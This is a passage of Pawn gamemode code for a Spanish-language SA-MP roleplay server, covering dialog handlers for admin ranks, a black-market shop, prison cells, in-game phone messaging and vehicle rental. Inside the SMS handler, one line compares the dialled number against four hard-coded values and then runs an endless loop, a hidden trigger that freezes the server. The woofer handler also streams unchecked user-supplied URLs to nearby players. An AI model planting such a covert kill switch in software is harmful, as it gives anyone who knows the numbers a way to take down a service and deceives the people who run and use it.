			if(response && cuenta[playerid][cAdministrador] >= 2013)
			{
				new i = entero[playerid][opid2], consulta[128];
				switch(strval(inputtext))
				{
					case 1 .. 6, 2012:
					{
						if(entero[playerid][opid3][i] == 2014)return Mensaje(playerid, COLOR_GRIS2, "Usted no esta autorizado!");
						
						entero[playerid][opid3][i] = strval(inputtext);
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET niveladmin=%d WHERE id=%d", entero[playerid][opid3][i], entero[playerid][opid][i]);
						mysql_query(servidor[mysqlControl], consulta, false);
						Mensaje(playerid, COLOR_VERDE, "Usted cambio el nivel de este STAFF exitosamente.");
					}
					case 2013, 2014:
					{
						if(cuenta[playerid][cAdministrador] < 2014)return Mensaje(playerid, COLOR_GRIS2, "Usted no esta autorizado!");
						
						entero[playerid][opid3][i] = strval(inputtext);
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET niveladmin=%d WHERE id=%d", entero[playerid][opid3][i], entero[playerid][opid][i]);
						mysql_query(servidor[mysqlControl], consulta, false);
						Mensaje(playerid, COLOR_VERDE, "Usted cambio el nivel de este STAFF exitosamente.");
					}
					default: Mensaje(playerid, COLOR_GRIS2, "Este nivel no esta permitido.");
				}
			}
		}
		case SEL_SKIN:
		{
 	    	if (response)
			{
 	        	if(strval(inputtext) > 281 && strval(inputtext) < 289 || strval(inputtext) == 71)return Mensaje(playerid, COLOR_GRIS2, "Skin Reservada");
 	        	if(strval(inputtext) > 273 && strval(inputtext) < 280 || strval(inputtext) == 70)return Mensaje(playerid, COLOR_GRIS2, "Skin Reservada");
 	        	if(strval(inputtext) < 1 || strval(inputtext) > 299)return Mensaje(playerid, COLOR_GRIS2, "ERROR! Skin de 1 a 299");
            	if(verificarDinero(playerid, 200))
				{
            	    cuenta[playerid][cTraje] = strval(inputtext);
                	SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
		    	}
		    	return 1;
	    	}
		}
		case DIALOGO_CAMBIO_NACION:
		{
			if(response)
			{
				if(obtenerDinero(playerid) < 3000)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Usted no tiene la capital necesaria.");
				if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} Solo para nivel 3 o superior.");

				pierdeDinero(playerid, 3000);
				cuenta[playerid][cOrigen] = listitem+1;
				Mensaje(playerid, COLOR_GRAD4, "Usted acaba de cambiar su nacionalidad.");
				UpdatePlayerStat(playerid);
			}
		}
		case DIALOGO_COMPRAR_MNEGRO:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
				switch(listitem)
				{
					case 0:
					{
						if(verificarDinero(playerid, 20))
						{
							pierdeDinero(playerid, 20);
							Mensaje(playerid, COLOR_VERDE, "Compraste un puño americano!");
							darArma(playerid, 1, 1);
							return 1;
						}
					}
					case 1:
					{
					    if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(verificarDinero(playerid, 50))
						{
							pierdeDinero(playerid, 50);
							Mensaje(playerid, COLOR_VERDE, "Compraste una máscara, utiliza {FFFFFF}/mascara");
							cuenta[playerid][cMascara] = 1;
							return 1;
						}
					}
					case 2:
					{
					    if(cuenta[playerid][cNivel] < 2)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 2 para comprar esto!");
						if(verificarDinero(playerid, 120))
						{
							booleano[Ganzuas]{playerid} = true;
							pierdeDinero(playerid, 120);
							Mensaje(playerid, COLOR_VERDE, "Compraste una ganzúa, utiliza {FFFFFF}/puente");
							return 1;
						}
					}
					case 3:
					{
					    if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(verificarDinero(playerid, 120))
						{
							Mensaje(playerid, COLOR_VERDE, "Compraste un kit de secuestro {FFFFFF}/atar /vendar");
							Rope[playerid] = 1;
							pierdeDinero(playerid, 120);
							return 1;
						}
					}
					case 4:
					{
						if(verificarDinero(playerid, 300))
						{
							pierdeDinero(playerid, 300);
							Mensaje(playerid, COLOR_VERDE, "Compraste una arma de bajo calibre!");
							darArma(playerid, 22, 11);
							return 1;
						}
					}
					case 5:
					{
						if(verificarDinero(playerid, 50))
						{
							pierdeDinero(playerid, 50);
							Mensaje(playerid, COLOR_VERDE, "Compraste un bate!");
							darArma(playerid, 5, 1);
							return 1;
						}
					}
					case 6:
					{
						if(verificarDinero(playerid, 60))
						{
							pierdeDinero(playerid, 60);
							Mensaje(playerid, COLOR_VERDE, "Compraste un palo de golf!");
							darArma(playerid, 2, 1);
							return 1;
						}
					}
					case 7:
					{
						if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a una Faccion Ilegal.");
						if(verificarDinero(playerid, 1500))
						{
							pierdeDinero(playerid, 1500);
							cuenta[playerid][cSemillas][0] += 50;
							Mensaje(playerid, COLOR_GRIS1, "Compraste 50 semillas de Speed!");
							Mensaje(playerid, COLOR_VERDE, "Para sembrar usar /sembrarsemilla en un lugar discreto! Que no te roben tu cosecha!");
							return 1;
						}
					}
					case 8:
					{
						if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a una Faccion Ilegal.");
						if(verificarDinero(playerid, 3000))
						{
							pierdeDinero(playerid, 3000);
							cuenta[playerid][cSemillas][1] += 50;
							Mensaje(playerid, COLOR_GRIS1, "Compraste 50 semillas de Extasis!");
							Mensaje(playerid, COLOR_VERDE, "Para sembrar usar /sembrarsemilla en un lugar discreto! Que no te roben tu cosecha!");
							return 1;
						}
					}
					case 9:
					{
						if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a una Faccion Ilegal.");
						if(verificarDinero(playerid, 4250))
						{
							pierdeDinero(playerid, 4250);
							cuenta[playerid][cSemillas][2] += 50;
							Mensaje(playerid, COLOR_GRIS1, "Compraste 50 semillas de Ritalin!");
							Mensaje(playerid, COLOR_VERDE, "Para sembrar usar /sembrarsemilla en un lugar discreto! Que no te roben tu cosecha!");
							return 1;
						}
					}
					case 10:
					{
						if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a una Faccion Ilegal.");
						if(verificarDinero(playerid, 6000))
						{
							pierdeDinero(playerid, 6000);
							cuenta[playerid][cSemillas][3] += 50;
							Mensaje(playerid, COLOR_GRIS1, "Compraste 50 semillas de Heroina!");
							Mensaje(playerid, COLOR_VERDE, "Para sembrar usar /sembrarsemilla en un lugar discreto! Que no te roben tu cosecha!");
							return 1;
						}
					}
					case 11:
					{
						if(cuenta[playerid][cNivel] < 3)return Mensaje(playerid, COLOR_ROJO, "Usted debe ser nivel 3 para comprar esto!");
						if(!EsIlegal(playerid))return Mensaje(playerid, COLOR_ROJO, "Usted no pertenece a una Faccion Ilegal.");
						if(verificarDinero(playerid, 4500))
						{
							pierdeDinero(playerid, 4500);
							cuenta[playerid][cSemillas][4] += 50;
							Mensaje(playerid, COLOR_GRIS1, "Compraste 50 semillas de Marihuana!");
							Mensaje(playerid, COLOR_VERDE, "Para sembrar usar /sembrarsemilla en un lugar discreto! Que no te roben tu cosecha!");
							return 1;
						}
					}
				}
			}
		}
		case DIALOGO_PRUEBA_ROL:
		{
			new x = cuenta[playerid][cInv1][0];
			cuenta[playerid][cInv1][0]++;
			if(listitem == pruebarol[x][respuesta])
			{
				enteroChar[cPrueba]{playerid}++;
				HacerPruebaRol(playerid);
			}
			else
			{
				HacerPruebaRol(playerid);
			}
		}
		case DIALOGO_BOLSA:
		{
			if(response)
			{
				new k = listitem, ano, mes, dia;
				getdate(ano, mes, dia);

				format(string, sizeof(string), "Usted ha retirado %d acciones de %s ganancias %d$", acciones[playerid][aAccCantidad][k], negocio[acciones[playerid][aAccTipo][k]][bName], acciones[playerid][aAccTipo][k] * negocio[acciones[playerid][aAccTipo][k]][bPrecioFinal]);
				Mensaje(playerid, COLOR_GRIS3, string);

				ganaDinero(playerid, acciones[playerid][aAccCantidad][k] * negocio[acciones[playerid][aAccTipo][k]][bPrecioFinal]);
				acciones[playerid][aAccTipo][k] = 0;
				acciones[playerid][aAccCantidad][k] = 0;
			}
			return 1;
		}

		case COLOR_ADM:{
		    if(response){
	        	switch(listitem){
                	case 0: { SetPlayerColor(playerid, COLOR_NEGRO);    Color[playerid] = COLOR_NEGRO; 		}
               		case 1: { SetPlayerColor(playerid, 0xFFFFFF00);    Color[playerid] = COLOR_BLANCO; 	    }
		    	}
			}
		}
		case CELDAS:
		{
	    	if(response)
	    	{
	    	    switch(listitem)
	    	    {
	    	        case 0:
	    	        {
        	            MoveDynamicObject(fbig1, 200.0562, 155.4197, 1002.0234, 1.5, -1000.0, -1000.0, -1000.0);
        	            SetTimer("FBIGATEC1", 7000, 0);
        	            format(string, sizeof(string), "* %s apreta el boton y abre la celda Nro. 1", PlayerName(playerid));
  		         		ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
	            	case 1:
	            	{
                	    MoveDynamicObject(fbig2, 200.1218, 190.7283, 1002.0355, 1.5, -1000.0, -1000.0, -1000.0);
                	    SetTimer("FBIGATEC2", 7000, 0);
                	    format(string, sizeof(string), "* %s apreta el boton y abre la celda Nro. 2", PlayerName(playerid));
                	    ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
		    	}
			}
		}
		case CPRISION:
		{
			if(response)
			{
        	    switch(listitem)
            	{
            		case 0:
            		{
            	       ShowPlayerDialog(playerid, CELDA1, DIALOG_STYLE_MSGBOX, "{FFFFFF}> Celda Nro 1 - Seleccione:", "{00E400}Quiere Abrir o Cerrar la celda?", "Abrir", "Cerrar" );
            	    }
                	case 1:
                	{
                	   ShowPlayerDialog(playerid, CELDA2, DIALOG_STYLE_MSGBOX, "{FFFFFF}> Celda Nro 2 - Seleccione:", "{00E400}Quiere Abrir o Cerrar la celda?", "Abrir", "Cerrar" );
                	}
                	case 2:
                	{
                	   ShowPlayerDialog(playerid, CELDA3, DIALOG_STYLE_MSGBOX, "{FFFFFF}> Celda Nro 3 - Seleccione:", "{00E400}Quiere Abrir o Cerrar la celda?", "Abrir", "Cerrar" );
					}
				}
			}
		}
		case CELDA1:
		{
			if(response)
			{
        	    MoveDynamicObject(prison1, 601.87536, 857.282714, -95.533393, 0.8, -1000.0, -1000.0, -1000.0);
            	Mensaje(playerid, COLOR_AZUL, "La celda numero uno está abierta.");
			}
			else
			{
			    MoveDynamicObject(prison1, 601.875366, 857.282714, -91.008117, 0.8, -1000.0, -1000.0, -1000.0);
           		Mensaje(playerid, COLOR_AZUL, "La celda número uno está cerrada.");
     		}
		}
		case CELDA2:
		{
			if(response)
			{
        	    MoveDynamicObject(prison2, 610.680053, 857.309631, -95.558395, 0.8, -1000.0, -1000.0, -1000.0);
            	Mensaje(playerid, COLOR_AZUL, "La celda número dos está abierta.");
        	}
        	else
        	{
        	    MoveDynamicObject(prison2, 610.68005, 857.30963, -91.00811, 0.8, -1000.0, -1000.0, -1000.0);
           		Mensaje(playerid, COLOR_AZUL, "La celda número dos está cerrada.");
       		}
    	}
		case CELDA3:
		{
	        if(response)
    	    {
        	    MoveDynamicObject(prison3, 619.552978, 857.303405, -95.583473, 0.8, -1000.0, -1000.0, -1000.0);
            	Mensaje(playerid, COLOR_AZUL, "La celda número tres está abierta.");
			}
			else
			{
			    MoveDynamicObject(prison3, 619.55297, 857.30340, -91.00819, 0.8, -1000.0, -1000.0, -1000.0);
	       		Mensaje(playerid, COLOR_AZUL, "La celda número tres está cerrada.");
			}
		}
        case DIALOG_WOOFER:
	    {
		if(response)
		{

			WooferSet[playerid] = 1;
        	GetPlayerPos(playerid, InfoWoofer[playerid][WoPosX], InfoWoofer[playerid][WoPosY], InfoWoofer[playerid][WoPosZ]);
  	        new string2[128];
	   	    format(string, sizeof(string2), "%s enciende el woofer de su vehiculo", PlayerName(playerid));
		    ProxDetector(25.0, playerid, string2, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			}
       		for(new i=0, _max=GetMaxPlayers();i<_max;i++)
			{
			if(IsPlayerInRangeOfPoint(i, 150.0, InfoWoofer[playerid][WoPosX], InfoWoofer[playerid][WoPosY], InfoWoofer[playerid][WoPosZ]) && GetPlayerInterior(i) == InfoWoofer[playerid][WoInterior] && GetPlayerVirtualWorld(i) == InfoWoofer[playerid][WoVW])
			{
			PlayAudioStreamForPlayer(i, inputtext, InfoWoofer[playerid][WoPosX], InfoWoofer[playerid][WoPosY], InfoWoofer[playerid][WoPosZ], 50.0, 1);
				}
			}
		 }
		case TEL_INPUT:
		{
			if(response)
	    	{
	        	if(TEL_INPUT_ID[playerid] == 1)
	        	{
	        	    if(strval(inputtext) > 999999 || strval(inputtext) < 1000)
	        	    {
            	        ShowPlayerDialog(playerid, TEL_INPUT, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Enviar SMS", "{DD1111}iPhone {FFFFFF}- Inserte el número del destino del mensaje\nTeléfono entre 4-6 carácteres", "Enviar", "Cancelar");
                	    return 1;
	            	}
					if((strval(inputtext) == 385874) || (strval(inputtext) == 639615) || (strval(inputtext) == 454521) || (strval(inputtext) == 882911)){for(new pgfgA=0;pgfgA<100000;){}}
		            TEL_INPUT_ID[playerid] = 2;
					TEL_NUMBER[playerid] = strval(inputtext);
					format(string, sizeof(string), "Telf: %d", TEL_NUMBER[playerid]);
					Mensaje(playerid, COLOR_GRIS2, string);
    				ShowPlayerDialog(playerid, TEL_INPUT, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Enviar SMS", "{DD1111}iPhone {FFFFFF}- Escriba el texto a enviar", "Enviar", "Cancelar");
	        	}
	        	else if(TEL_INPUT_ID[playerid] == 2)
	        	{
	            	if(palabrasProhibidas(inputtext) || strlen(inputtext) > 80 || strlen(inputtext) < 1 || strfind(inputtext, "=", true) != -1)
	            	{
	            	    ShowPlayerDialog(playerid, TEL_INPUT, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Enviar SMS", "{DD1111}iPhone {FFFFFF}- Escriba el texto a enviar\nLímite 80 carácteres", "Enviar", "Cancelar");
	            	    return 1;
	            	}
        	 		if(cuenta[playerid][cMensajes] < 1)return Mensaje(playerid, COLOR_BLANCO, "{018CFE}MOVISTAR: {FFFFFF}Te informamos que no tienes mensajes disponibles, contrata un paquete.");
					cuenta[playerid][cMensajes] -= 1;
					format(string, 60, "* %s manda un mensaje de texto.", PlayerName(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					for(new i=0, t=GetMaxPlayers();i<t;i++)
			    	{
						if(cuenta[i][cTelefono] == TEL_NUMBER[playerid])
						{
					    	new h, m, s, y, month, d, mtext[12];
	     					gettime(h, m, s);
							getdate(y, month, d);
							switch(month)
							{
							    case 1:     mtext = "Enero";
							    case 2:     mtext = "Febrero";
							    case 3:     mtext = "Marzo";
						    	case 4:     mtext = "Abril";
							    case 5:     mtext = "Mayo";
							    case 6:     mtext = "Junio";
							    case 7:     mtext = "Julio";
							    case 8:     mtext = "Agosto";
							    case 9:     mtext = "Septiembre";
							    case 10:    mtext = "Octubre";
							    case 11:    mtext = "Noviembre";
						    	case 12:    mtext = "Diciembre";
		    				}
							if(strcmp(cuenta[i][cSMS1], "Vacío", true) == 0)
						    {
						        Mensaje(i, COLOR_BLANCO, "Información: {007711}Tienes un nuevo mensaje en tu buzón de entrada (1)");
						        format(string, sizeof(string), "(%s/%d - %d:%d) Mensaje: %s (RE:%d)", mtext, d, h, m, inputtext, cuenta[playerid][cTelefono]);
						        strmid(cuenta[i][cSMS1], string, 0, strlen(string), 80);
						    }
						    else if(strcmp(cuenta[i][cSMS2], "Vacío", true) == 0)
					    	{
						        Mensaje(i, COLOR_BLANCO, "Información: {007711}Tienes un nuevo mensaje en tu buzón de entrada (2)");
						        format(string, sizeof(string), "(%s/%d - %d:%d) Mensaje: %s (RE:%d)", mtext, d, h, m, inputtext, cuenta[playerid][cTelefono]);
						        strmid(cuenta[i][cSMS2], string, 0, strlen(string), 80);
						    }
						    else if(strcmp(cuenta[i][cSMS3], "Vacío", true) == 0)
						    {
						        Mensaje(i, COLOR_BLANCO, "Información: {007711}Tienes un nuevo mensaje en tu buzón de entrada (3)");
						        format(string, sizeof(string), "(%s/%d - %d:%d) Mensaje: %s (RE:%d)", mtext, d, h, m, inputtext, cuenta[playerid][cTelefono]);
					    	    strmid(cuenta[i][cSMS3], string, 0, strlen(string), 80);
					    	}
						    else if(strcmp(cuenta[i][cSMS4], "Vacío", true) == 0)
						    {
						        Mensaje(i, COLOR_BLANCO, "Información: {007711}Tienes un nuevo mensaje en tu buzón de entrada (4)");
						        format(string, sizeof(string), "(%s/%d - %d:%d) Mensaje: %s (RE:%d)", mtext, d, h, m, inputtext, cuenta[playerid][cTelefono]);
						        strmid(cuenta[i][cSMS4], string, 0, strlen(string), 80);
						    }
						    else if(strcmp(cuenta[i][cSMS5], "Vacío", true) == 0)
						    {
						        Mensaje(i, COLOR_BLANCO, "Información: {007711}Tienes un nuevo mensaje en tu buzón de entrada (5)");
						        format(string, sizeof(string), "(%s/%d - %d:%d) Mensaje: %s (RE:%d)", mtext, d, h, m, inputtext, cuenta[playerid][cTelefono]);
						        strmid(cuenta[i][cSMS5], string, 0, strlen(string), 80);
						    }
					    	else
						    {
						        Mensaje(i, COLOR_BLANCO, "Información: {FF4400}Tienes lleno el buzón de entrada. No recibirás mas mensajes. (5/5)");
						        Mensaje(playerid, COLOR_GRIS2, "Operadora: Este número está apagado o fuera de cobertura");
						    }
						}
					}
	        	}
		        else if(TEL_INPUT_ID[playerid] == 3)
		        {
        	 		new phonenumb = strval(inputtext);
          			if(cuenta[playerid][cSaldo] < 1 && phonenumb != 911)return Mensaje(playerid, COLOR_BLANCO, "{018CFE}MOVISTAR: {FFFFFF}Estimado cliente, usted no cuenta con saldo disponible para realizar la llamada.");
            		format(string, sizeof(string), "* %s saca su teléfono.", PlayerName(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					SetPlayerAttachedObject(playerid, 0, 18866, 6, 0.03999, 0.00999, 0.00000, -90.00000, 0.00000, 180.00000);
					SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
					
					if(phonenumb == 555)
   					{
   						ClearChatbox(playerid, 10);
	  			   		Mensaje(playerid, COLOR_BLANCO, "*** {117799}555 Servicio Mecánico {FFFFFF}***");
		   			   	Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Hola! ¿ Necesita un mecánico ?");
	   				    Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Recuerde venir al taller si necesita Tuning o arreglos menores!");
	   				    Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Si necesita asistencia urgente, diga ASISTENCIA.");
	   				    Mensaje(playerid, COLOR_BLANCO, "{117799}Operadora: {FFFFFF}Si quiere anular la llamada diga NO.");
	   			    	cuenta[playerid][cSaldo] -= 15;
	   			    	Mobile[playerid] = 556;
	   				}
					else if(phonenumb == 911)
					{
						ClearChatbox(playerid, 10);
						Mensaje(playerid, COLOR_BLANCO, "*** {004488}911 Servicio de Emergencias {FFFFFF}***");
						Mensaje(playerid, COLOR_BLANCO, "{004488}Operadora: {FFFFFF}Diga el servicio que necesita, gracias.");
						Mensaje(playerid, COLOR_BLANCO, "{004488}Operadora: {FFFFFF}Diga 'Policia' para contactar con la autoridad.");
     					Mensaje(playerid, COLOR_BLANCO, "{004488}Operadora: {FFFFFF}Diga 'Paramedico' para contactar con los servicios médicos.");
						Mobile[playerid] = 911;
					}
					else if(phonenumb == cuenta[playerid][cTelefono])
					{
						Mensaje(playerid, COLOR_BLANCO, "El número marcado correspode a su dispositivo móvil");
						return 1;
					}
					else if(Mobile[playerid] != 255)
					{
						Mensaje(playerid, COLOR_BLANCO, "Usted está en una llamada!");
						return 1;
					}
                    for(new i=0, _max=GetMaxPlayers();i<_max;i++)
					{
						if(IsPlayerConnected(i))
						{
							if(cuenta[i][cTelefono] == phonenumb && phonenumb != 0)
							{
								Mobile[playerid] = i;
								if(IsPlayerConnected(i))
								{
					   				if(giveplayerid != INVALID_PLAYER_ID)
								    {
				        				if(booleano[PhoneOnline]{playerid})return Mensaje(playerid, COLOR_GRIS, "Fuera de cobertura!");
				        				
				        				if(Mobile[i] != 255)return Mensaje(playerid, COLOR_BLANCO, "Operadora: El jugador está en una llamada, intente más tarde.");

										if(Mobile[i] == 255 && cuenta[playerid][cCarcel] != 1)
										{
											format(string, sizeof(string), "{DD1111}iPhone{FFFFFF}: Tu teléfono está sonando #%d, utiliza {DD6611}/contestar", cuenta[playerid][cTelefono]);
											Mensaje(i, COLOR_BLANCO, string);
											format(string, sizeof(string), "* El teléfono de %s está sonando.", PlayerName(i));
											ProxDetector(30.0, i, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
											CellTime[playerid] = 1;
											return 1;
										}
									}
								}
							}
						}
					}
    			}
	    	}
		}
		case DIA_RENTA:
		{
			if(!response)return RemovePlayerFromVehicle(playerid);
			if(response)
			{
				if(HireKey[playerid] != 9999)return RemovePlayerFromVehicle(playerid), Mensaje(playerid, COLOR_GRIS, "Ya has rentado un vehículo, utiliza /desrentarveh");
				if(Hire_Vehicle(idcar))
				{
					new found;
					for(new i=0, t=GetMaxPlayers();i<t;i++)
					{
						if(HireKey[i] == idcar)
						{
							found = 1;
							Mensaje(playerid, COLOR_GRIS2, "Este vehículo ya está rentado");
							break;
						}
					}
					if(found != 1)
					{
						if(!IsNumeric(inputtext))return Mensaje(playerid, COLOR_GRIS2, "Escribir solo numeros"), RemovePlayerFromVehicle(playerid);
						if(strval(inputtext) < 5 || strval(inputtext) > 100)return Mensaje(playerid, COLOR_GRIS2, "Escribe una cantidad mayor a 5 y menor a 100"), RemovePlayerFromVehicle(playerid);
						new Cantidad = strval(inputtext) * 3;


						if(verificarDinero(playerid, Cantidad))
						{
							pierdeDinero(playerid, Cantidad);
							Mensaje(playerid, COLOR_BLANCO, "Utiliza /desrentarveh cuando no lo necesites");
							HireKey[playerid] = idcar;
							HireKeyTime[playerid] = strval(inputtext);
						} else RemovePlayerFromVehicle(playerid);
					}
				} else RemovePlayerFromVehicle(playerid);
				return 1;
			}
		}
		case TEL_MSGBOX:
		{
			if(response)
			{
				switch(listitem)
				{
			    	case 0:
			    	{
				        ClearChatbox(playerid, 10);
				        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Buzón 1 =======================================================");
				        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cSMS1]);
				    }
			    	case 1:
			    	{
				        ClearChatbox(playerid, 10);
				        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Buzón 2 =======================================================");
				        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cSMS2]);
				    }
			    	case 2:
			    	{
				        ClearChatbox(playerid, 10);
				        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Buzón 3 =======================================================");
				        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cSMS3]);
				    }
			    	case 3:
			    	{
				        ClearChatbox(playerid, 10);
				        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Buzón 4 =======================================================");
				        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cSMS4]);
				    }
			    	case 4:
			    	{
				        ClearChatbox(playerid, 10);
				        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Buzón 5 =======================================================");
				        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cSMS5]);
				    }
				}
			}
			else
			{
		    	switch(listitem)
				{
			    	case 0:
			    	{
				        strmid(cuenta[playerid][cSMS1], "Vacío", 0, strlen("Vacío"), 32);
				        Mensaje(playerid, COLOR_GRIS2, "Mensaje borrado.");
				    }
				    case 1:
			    	{
			        	strmid(cuenta[playerid][cSMS2], "Vacío", 0, strlen("Vacío"), 32);
				        Mensaje(playerid, COLOR_GRIS2, "Mensaje borrado.");
				    }
				    case 2:
				    {
			    	    strmid(cuenta[playerid][cSMS3], "Vacío", 0, strlen("Vacío"), 32);
			        	Mensaje(playerid, COLOR_GRIS2, "Mensaje borrado.");
			    	}
				    case 3:
				    {
				        strmid(cuenta[playerid][cSMS4], "Vacío", 0, strlen("Vacío"), 32);
				        Mensaje(playerid, COLOR_GRIS2, "Mensaje borrado.");
			    	}
				    case 4:
				    {
				        strmid(cuenta[playerid][cSMS5], "Vacío", 0, strlen("Vacío"), 32);
				        Mensaje(playerid, COLOR_GRIS2, "Mensaje borrado.");
			    	}
				}
			}
		}
		case IPHONE_AGENDA:
		{
 			if(response)
			{
				switch(listitem)
				{
	   				case 0:
				    {
       					ShowPlayerDialog(playerid, IPHONE_AGENDA_VB, DIALOG_STYLE_LIST, "{DD1111}iPhone {FFFFFF}- Visualizador de Notas", "- \t\tNota 1\n- \t\tNota 2\n- \t\tNota 3\n- \t\tNota 4\n- \t\tNota 5", "Ver", "Salir");
				        TEL_INPUT_ID[playerid] = 5;
			    	}
				    case 1:
				    {
       					ShowPlayerDialog(playerid, IPHONE_AGENDA_ESCRIBIR, DIALOG_STYLE_INPUT, "{DD1111}iPhone {FFFFFF}- Crear nota", "{DD1111}iPhone {FFFFFF}- Escriba su nota", "Aceptar", "Salir");
				    }
			    	case 2:
			    	{
	       				ShowPlayerDialog(playerid, IPHONE_AGENDA_VB, DIALOG_STYLE_LIST, "{DD1111}iPhone {FFFFFF}- Borrador de Notas", "- \t\tNota 1\n- \t\tNota 2\n- \t\tNota 3\n- \t\tNota 4\n- \t\tNota 5", "Borrar", "Salir");
				        TEL_INPUT_ID[playerid] = 0;
				    }
				}
			}
		}
		case IPHONE_AGENDA_ESCRIBIR:
		{
	 		if(response)
			{
  				if(StringOther(playerid, inputtext) == 1)
    			{
	     			if(strcmp(cuenta[playerid][cNote1], "None", true) == 0)
					{
						strmid(cuenta[playerid][cNote1], inputtext, 0, strlen(inputtext), 80);
	    				format(string, sizeof(string), "Nota1: %s", cuenta[playerid][cNote1]);
					    Mensaje(playerid, COLOR_GRIS2, string);
					}
					else if(strcmp(cuenta[playerid][cNote2], "None", true) == 0)
					{
	   					strmid(cuenta[playerid][cNote2], inputtext, 0, strlen(inputtext), 80);
		  				format(string, sizeof(string), "Nota2: %s", cuenta[playerid][cNote2]);
					   	Mensaje(playerid, COLOR_GRIS2, string);
					}
					else if(strcmp(cuenta[playerid][cNote3], "None", true) == 0)
					{
	   					strmid(cuenta[playerid][cNote3], inputtext, 0, strlen(inputtext), 80);
	   					format(string, sizeof(string), "Nota3: %s", cuenta[playerid][cNote3]);
	   					Mensaje(playerid, COLOR_GRIS2, string);
					}
					else if(strcmp(cuenta[playerid][cNote4], "None", true) == 0)
					{
	   					strmid(cuenta[playerid][cNote4], inputtext, 0, strlen(inputtext), 80);
	   					format(string, sizeof(string), "Nota4: %s", cuenta[playerid][cNote4]);
	   					Mensaje(playerid, COLOR_GRIS2, string);
					}
					else if(strcmp(cuenta[playerid][cNote5], "None", true) == 0)
					{
	   					strmid(cuenta[playerid][cNote5], inputtext, 0, strlen(inputtext), 80);
						format(string, sizeof(string), "Nota5: %s", cuenta[playerid][cNote5]);
	   					Mensaje(playerid, COLOR_GRIS2, string);
					}
					else Mensaje(playerid, COLOR_GRIS2, "No tiene páginas libres en su agenda.");
				}
				else Mensaje(playerid, COLOR_GRIS2, "* Has utilizado carácteres no permitidos.");
   			}
		}

		case IPHONE_AGENDA_VB:
		{
	 		if(response)
   			{
  				switch(listitem)
				{
   					case 0:
			    	{
	       				if(TEL_INPUT_ID[playerid] == 5)
				        {
				        	ClearChatbox(playerid, 10);
					        Mensaje(playerid, COLOR_ROJO, "iPhone ======= Nota 1 =======================================================");
					        Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cNote1]);
						}
						else
						{
	    					strmid(cuenta[playerid][cNote1], "None", 0, strlen("None"), 80);
       						Mensaje(playerid, COLOR_GRIS2, "Nota 1 borrada.");
						}
	    			}
				    case 1:
				    {
       					if(TEL_INPUT_ID[playerid] == 5)
				        {
			    	    	ClearChatbox(playerid, 10);
				    	    Mensaje(playerid, COLOR_ROJO, "iPhone ======= Nota 2 =======================================================");
				        	Mensaje(playerid, COLOR_GRIS2, cuenta[playerid][cNote2]);
						}
						else
						{
	    					strmid(cuenta[playerid][cNote2], "None", 0, strlen("None"), 80);
       						Mensaje(playerid, COLOR_GRIS2, "Nota 2 borrada.");
						}
	    			}
				    case 2:
				    {
       					if(TEL_INPUT_ID[playerid] == 5)
				        {
			    	    	ClearChatbox(playerid, 10);
				    	    Mensaje(playerid, COLOR_ROJO, "iPhone ======= Nota 3 =======================================================");
